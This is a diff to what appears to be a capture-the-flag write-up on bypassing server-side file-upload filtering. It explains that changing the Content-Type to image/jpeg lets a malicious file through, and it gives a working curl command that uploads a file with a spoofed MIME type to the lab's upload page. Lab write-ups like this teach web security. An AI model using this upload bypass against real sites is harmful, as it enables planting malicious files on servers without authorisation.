@@ -1,9 +1,7 @@
- =If the filtering is performed on the server-side, then various techniques can be attempted to bypass it, including: Change the value of Content-Type as image/jpeg in HTTP request.
+If the filtering is performed on the server-side, then various techniques can be attempted to bypass it, including: Change the value of Content-Type as image/jpeg in HTTP request.
 
 on the page http://192.168.1.33/?page=upload
 
 we can upload a malicious file just by changing the value of Content-type like this :
 
-curl -X POST http://192.168.1.33/\?page\=upload -F MAX_FILE_SIZE=100000 -F "uploaded=@../shit.txt;type=image/jpg" -F Upload=Upload
-
-as a response we get the flag
+curl -X POST http://<ip>/?page=upload -F MAX_FILE_SIZE=100000 -F "uploaded=@malicious.txt;type=image/jpg" -F Upload=Upload | grep flag
